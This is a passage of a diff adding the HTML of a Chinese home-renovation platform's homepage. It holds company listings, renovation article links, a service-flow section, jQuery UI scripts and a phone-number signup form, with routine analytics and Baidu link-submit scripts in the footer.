+                                        好评率：<span class="panel-red">98%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">4</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">478</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/4.html">免费设计</a>
+                                </div>
+                                
+                            </div><!-- 公司名片 -->
+                            <div class="panel">
+                                <a href="/ZxCompany/detail/6.html">
+                                <div class="panel-imgBox">
+                                    <img src="/Public/home/src/res/comm3.png" alt="厦门星艺装饰有限公司" title="厦门星艺装饰有限公司">
+                                </div>
+                                </a><div class="panel-content"><a href="/ZxCompany/detail/6.html">
+                                    <img class="panel-logo" src="/Uploads/Picture/2017-08-03/5982c2e49978a.png" alt="厦门星艺装饰有限公司" title="厦门星艺装饰有限公司">
+                                    <div class="panel-name">厦门星艺装饰有限公司</div>
+                                    <div class="panel-detail">
+                                        好评率：<span class="panel-red">98%</span>&nbsp;&nbsp;&nbsp;&nbsp;设计方案：<span class="panel-red">3</span>&nbsp;&nbsp;&nbsp;&nbsp;关注数：<span class="panel-red">484</span>
+                                    </div>
+                                    </a><a class="panel-link" href="/ZxCompany/detail/6.html">免费设计</a>
+                                </div>
+                                
+                            </div>                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- 盒子 -->
+    <div class="box bg-gray">
+        <div class="box-title">
+            装修学堂资讯
+        </div>
+        <div class="box-subTitle">
+            从装修设计到施工&nbsp;&nbsp;没有你学不到
+        </div>
+        <div class="container">
+            <div class="flex flex-between">
+                <!-- 学堂卡片 -->
+                <div class="school">
+                    <a href="/Information/index/position/zxlc.html">
+                    <div class="school-imgBox school-imgBox1">
+                        装修流程
+                    </div>
+                        </a>
+                    <div class="school-content">
+                        <div class="school-card">
+                            <a class="flex" href="/Information/details/1056.html">
+                                <img class="school-cardImg" src="/Uploads/Picture/2018-01-03/5a4ca2eb33418.png" alt="装修队特点有哪些 装修公司有哪..." title="装修队特点有哪些 装修公司有哪..." width="140" height="90">
+                                <div class="flex-ele">
+                                    <div class="school-title">装修队特点有哪些 装修公司有哪...</div>
+                                    <div class="school-text">敲敲打打装修平台供给的装修服务为业主全程保障，出现质量问题先...</div>
+                                </div>
+                            </a>
+                        </div>                        <a class="school-link link link-block" href="/Information/details/1055.html">
+                                装修保障服务有哪些 装修公司装修服务保障要怎么评估-敲敲打打                              </a><a class="school-link link link-block" href="/Information/details/1054.html">
+                                装修保障包括哪些 装修公司的装修保障方法有哪些-敲敲打打                            </a><a class="school-link link link-block" href="/Information/details/1053.html">
+                                中式别墅软装设计定制方案 别墅软装设计要考虑哪些-敲敲打打                            </a><a class="school-link link link-block" href="/Information/details/1052.html">
+                                软装设计师手册在线指南_软装设计师手册内容-敲敲打打                            </a>
+                    </div>
+                </div>
+                <!-- 学堂卡片 -->
+                <div class="school">
+                    <a href="/Information/index/position/zxxt.html">
+                        <div class="school-imgBox school-imgBox2">
+                            装修学堂
+                        </div>
+                    </a>
+                    <div class="school-content">
+                        <div class="school-card">
+                                <a class="flex" href="/Information/details/951.html">
+                                    <img class="school-cardImg" src="/Uploads/Picture/2016-11-23/5834f1151efe2.jpg" alt="石材护理需从分析病症开始" title="石材护理需从分析病症开始" width="140" height="90">
+                                    <div class="flex-ele">
+                                        <div class="school-title">石材护理需从分析病症开始</div>
+                                        <div class="school-text">石材，做为一种时尚、高档的建筑材料，相信许多人对石材护理价格...</div>
+                                    </div>
+                                </a>
+                            </div>                        <a class="school-link link link-block" href="/Information/details/932.html">
+                                门锁不好开怎么办 有哪些好的方法                            </a><a class="school-link link link-block" href="/Information/details/913.html">
+                                生活小常识之瓷砖清洁技巧_装修建材知识                            </a><a class="school-link link link-block" href="/Information/details/885.html">
+                                外墙涂料的选购要点                            </a><a class="school-link link link-block" href="/Information/details/862.html">
+                                建材选购知识：卫浴装修如何选择合适坐便器                            </a>                    </div>
+                </div>
+                <!-- 学堂卡片 -->
+                <div class="school">
+                    <a href="/Information/index/position/zxzt.html">
+                    <div class="school-imgBox school-imgBox3">
+                        装修专题
+                    </div>
+                        </a>
+                    <div class="school-content">
+                        <div class="school-card">
+                                <a class="flex" href="/Information/details/713.html">
+                                    <img class="school-cardImg" src="/Uploads/Picture/2016-05-31/574ce5c22b401.jpg" alt="墙布or墙纸 你更偏向于哪一种..." title="墙布or墙纸 你更偏向于哪一种..." width="140" height="90">
+                                    <div class="flex-ele">
+                                        <div class="school-title">墙布or墙纸 你更偏向于哪一种...</div>
+                                        <div class="school-text">墙布和墙纸在家里是很常见的两样装饰，但是对于无缝墙布与墙纸的...</div>
+                                    </div>
+                                </a>
+                            </div>                        <a class="school-link link link-block" href="/Information/details/676.html">
+                                &nbsp;玻璃也可以做背景墙 画面太美了                            </a><a class="school-link link link-block" href="/Information/details/655.html">
+                                拒绝单调呆板 从这里做起.........                            </a><a class="school-link link link-block" href="/Information/details/621.html">
+                                为你的墙面添上一层新妆，发挥墙面“本色”                            </a><a class="school-link link link-block" href="/Information/details/516.html">
+                                关于玻璃制品在日常生活当中的保养和注意事项                            </a>                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- 盒子 -->
+    <div class="box bg-height">
+        <div class="box-title">
+            服务流程
+        </div>
+        <div class="container">
+            <!-- 服务流程 -->
+            <div class="flow">
+                <div class="container flex flex-between">
+                    <div class="flow-item">
+                        <i class="png png-flowa"></i>
+                        <div class="flow-title">在线预约</div>
+                        <div class="flow-text">登记联系方式</div>
+                    </div>
+                    <div class="flow-item">
+                        <i class="png png-flowb"></i>
+                        <div class="flow-title">量房沟通</div>
+                        <div class="flow-text">3家装修公司</div>
+                        <div class="flow-text2">免费量房设计</div>
+                    </div>
+                    <div class="flow-item">
+                        <i class="png png-flowc"></i>
+                        <div class="flow-title">对比方案</div>
+                        <div class="flow-text">对比装修公司</div>
+                        <div class="flow-text2">方案</div>
+                    </div>
+                    <div class="flow-item">
+                        <i class="png png-flowd"></i>
+                        <div class="flow-title">签订合同</div>
+                        <div class="flow-text">签订装修合同</div>
+                    </div>
+                    <div class="flow-item">
+                        <i class="png png-flowe"></i>
+                        <div class="flow-title">装修施工</div>
+                        <div class="flow-text">装修公司进场</div>
+                        <div class="flow-text2">施工</div>
+                    </div>
+                    <div class="flow-item">
+                        <i class="png png-flowf"></i>
+                        <div class="flow-title">竣工验收</div>
+                        <div class="flow-text">验收通过全屋</div>
+                        <div class="flow-text2">装修指标</div>
+                    </div>
+                    <div class="flow-item">
+                        <i class="png png-flowg"></i>
+                        <div class="flow-title">安心保障</div>
+                        <div class="flow-text">三年装修质量</div>
+                        <div class="flow-text2">保险</div>
+                    </div>
+                </div>
+                <div class="container">
+                    <div class="flow-num">
+                        <img src="/Public/home/src/res/flownum.png" alt="">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+   <!-- <script src="/Public/home/src/js/jquery.min.js"></script>
+    <script src="/Public/home/src/js/swiper.min.js"></script>
+    <script src="/Public/home/src/js/jquery.lazyload.js"></script>
+    <script src="/Public/home/src/js/jquery.sliphover.js"></script>
+    <script src="/Public/home/src/js/plugins.js"></script>-->
+    <script>
+        $(function() {
+            var $winH = $(window).height();
+            var $headerTop = $(".header");
+            var $helpUp = $(".help-up");
+            $(window).scroll(function() {
+                var $top = $(this).scrollTop();
+                if ($top > 0) {
+                    $headerTop.addClass("active");
+                } else {
+                    $headerTop.removeClass("active");
+                }
+                if ($top > $winH) {
+                    $helpUp.addClass("active");
+                } else {
+                    $helpUp.removeClass("active")
+                }
+            });
+            // 获得焦点
+            $(".header-search").focusin(function() {
+                $(this).addClass("active");
+                $(".header-menu").addClass("hide");
+                $(this).children(".select").removeClass("hide");
+            });
+            $(".header-main,.header-body").on("click", function(e) {
+                if (e.target == $(this).get(0)) {
+                    $(".header-search").removeClass("active");
+                    $(".header-menu").removeClass("hide");
+                    $(".header-search").children(".select").addClass("hide");
+                }
+            });
+
+
+            // 返回顶部
+            $(".help-up").on("click", function() {
+                $("body,html").animate({
+                    scrollTop: 0
+                }, 1000);
+            });
+            // 选择栏-弹出下来菜单
+            $(".select-text").on("click", function() {
+                var $next = $(this).next("");
+                if (!$next.hasClass("active")) {
+                    $next.addClass("active");
+                }
+            });
+            // 选择栏-选择内容
+            $(".select-dropItem").on("click", function() {
+                var txt = $(this).text();
+                $(this).parent().parent().children(".select-text").text(txt);
+                $(this).parent().removeClass("active");
+            });
+            // 新添加2017-9-15
+            $(".select-dropMenu").mouseleave(function() {
+                $(this).removeClass("active");
+            });
+            var mySwiper = new Swiper('.swiper-container', {
+                loop: true,
+                noSwiping: true,
+                speed: 700,
+                autoplay: 3000,
+                autoplayDisableOnInteraction: false,
+                //autoplay:true,//等同于以下设置
+                pagination: '.swiper-pagination',
+                nextButton: '.swiper-button-next',
+                prevButton: '.swiper-button-prev',
+            });
+            // 切换
+            $(".tab-link").hover(function() {
+                var $tab = $(this).parent().parent();
+                $(this).parent().children(".tab-link").removeClass("active");
+                $(this).addClass("active");
+                var index = $(this).index();
+                var $items = $tab.find(".tab-item");
+                $items.removeClass("active").eq(index).addClass("active");
+            }, function() {
+               // $(this).removeClass("active");
+            })
+            // 案例图片
+            $('.paint').sliphover({
+                backgroundColor: 'rgba(0,0,0,.5)'
+            });
+            // 首页－立即申请
+            var indexFlag = true;
+            $(".seek-btn").on("click", function() {
+                var city = $(".seek-content .select-text").text().trim();
+                var tel = $(".seek-input").val().trim();
+                var telReg = /^1[34578]\d{9}$/;
+                if (tel.length < 11) {
+                    $.toast({
+                        text: "请输入11位手机号"
+                    })
+                    return false;
+                }
+                if (telReg.test(tel) == false) {
+                    $.toast({
+                        text: "请输入有效手机号"
+                    })
+                    return false;
+                }
+                if (indexFlag) {
+                    indexFlag = false;
+                    var url="/ZxCompany/save_ment";
+                    $.ajax({
+                        url: url,
+                        type: "post",
+                        data: {
+                            city: city,
+                            member_tel: tel
+                        },
+                        success: function(res) {
+                            //成功后
+                            res = jQuery.parseJSON(res);
+                            if (res.code == 200) {
+                                $.toast({text: res.msg});
+                            }
+                        },
+                        error: function() {
+                            $.toast({
+                                text: "出错了"
+                            })
+                        },
+                        complete: function() {
+                            indexFlag = true;
+                        }
+                    });
+                }
+            });
+
+
+        });
+    </script>
+
+
+    
+<!-- /主体 -->
+
+<!-- 底部 -->
+<!-- 底部 -->
+<div class="footer">
+    <div class="container flex flex-between">
+        <div class="footer-left">
+            <div class="footer-item">
+                <div class="footer-name">
+                    <a class="link link-block link-no link-color" href="javascript:void(0);">了解我们</a>
+                </div>
+                <a class="link link-block link-color" href="/Index/about_us.html">关于我们</a>
+                <a class="link link-block link-color" href="/Index/recruit.html">招贤纳士</a>
+                <a class="link link-block link-color" href="/Index/service.html">服务条款</a>
+                <a class="link link-block link-color" href="/Index/feedback.html">意见反馈</a>
+            </div>
+            <div class="footer-item">
+                <div class="footer-name">
+                    <a class="link link-block link-no link-color" href="javascript:void(0);">装修服务</a>
+                </div>
+                <a class="link link-block link-color" href="/Index/design.html">免费设计</a>
+                <a class="link link-block link-color" href="/Index/stages.html">免息分期</a>
+                <a class="link link-block link-color" href="/Index/insurance.html">安心保障</a>
+            </div>
+            <div class="footer-item">
+                <div class="footer-name">
+                    <a class="link link-block link-no link-color" href="javascript:void(0);">联系我们</a>
+                </div>
+                <div>
+                    地址：福建省厦门市思明区软件园二期望海路57号之一四楼
+                </div>
+            </div>
+            <div class="footer-rightCopy">
+                <div>
+                    免责声明：本网站部分内容由用户自行上传，如权利人发现存在误传其作品情形，请及时与本站联系。
+                </div>
+                <div style=" display: inline-block;">
+                福建省向天科技股份有限公司闽ICP备16014874号  <script src="https://s11.cnzz.com/z_stat.php?id=1261534001&amp;web_id=1261534001" language="JavaScript"></script><script src="https://c.cnzz.com/core.php?web_id=1261534001&amp;t=z" charset="utf-8" type="text/javascript"></script><a href="http://www.cnzz.com/stat/website.php?web_id=1261534001" target="_blank" title="站长统计">站长统计</a>
+            </div>
+                <div class="footer-websites">
+                        友情链接：
+                        <ul class="clearfix">
+                            <li>
+                                    <a href="http://danxia.com/" target="_blank">
+                                       厦门二手房                                    </a>
+                                </li><li>
+                                    <a href="http://zhuanghuang.jiameng.com" target="_blank">
+                                       装修公司加盟                                    </a>
+                                </li><li>
+                                    <a href="http://jiaju.91jm.com/" target="_blank">
+                                       家居加盟                                    </a>
+                                </li><li>
+                                    <a href="http://www.haianzhuangshi.com" target="_blank">
+                                       酒店设计                                    </a>
+                                </li><li>
+                                    <a href="http://www.sllssrq.com " target="_blank">
+                                       暖气片                                    </a>
+                                </li><li>
+                                    <a href="http://www.qqdd.com/Information.html" target="_blank">
+                                       装修课堂                                    </a>
+                                </li><li>
+                                    <a href="http://www.qqdd.com/Case.html" target="_blank">
+                                       装修效果图                                    </a>
+                                </li><li>
+                                    <a href="http://www.qqdd.com/ZxCompany.html" target="_blank">
+                                       装修公司                                    </a>
+                                </li><li>
+                                    <a href="http://www.landizs.com" target="_blank">
+                                       装修公司                                    </a>
+                                </li><li>
+                                    <a href="http://www.miusi.co/ " target="_blank">
+                                       上海别墅装修                                    </a>
+                                </li>                        </ul>
+                    </div>            </div>
+        </div>
+        <div class="footer-right">
+            <div class="footer-tel">
+                0592-5962000
+            </div>
+            <div class="footer-day">
+                周一至周日 9：00 - 18：00
+            </div>
+            <div class="footer-qrbox flex flex-between">
+                <div class="footer-qritem footer-qritem1">
+                    <img src="/Public/home/src/res/qdApp.jpg" alt="">
+                    <div class="footer-qrtext">敲敲打打APP</div>
+                </div>
+                <div class="footer-qritem">
+                    <img src="/Public/home/src/res/qdWx.jpg" alt="">
+                    <div class="footer-qrtext"> 微信公众号</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- 帮助 -->
+<div class="help">
+    <div class="help-item">
+        <a href="javascript:void(0);">
+            <i class="icon icon-headphone-alt"></i>
+        </a>
+        <div class="help-tel">
+            <div class="help-title">客服中心：</div>
+            <div class="help-text">0592-5962000</div>
+            <div class="help-line"></div>
+            <div class="help-title">在线时间：</div>
+            <div class="help-text">AM9:00-PM18:00</div>
+        </div>
+    </div>
+    <div class="help-item">
+        <a href="javascript:void(0);">
+            <i class="icon icon-qr"></i>
+        </a>
+        <div class="help-code">
+            <img src="/Public/home/src/res/qdApp.jpg" alt="">
+            <div class="help-codeText">微信公众号</div>
+            <img src="/Public/home/src/res/qdWx.jpg" alt="">
+            <div class="help-codeText">APP二维码</div>
+        </div>
+    </div>
+    <div class="help-item help-up">
+        <i class="icon icon-up"></i>
+    </div>
+</div>
+
+<script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else{
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+<!-- /底部 -->
+
+</body></html>
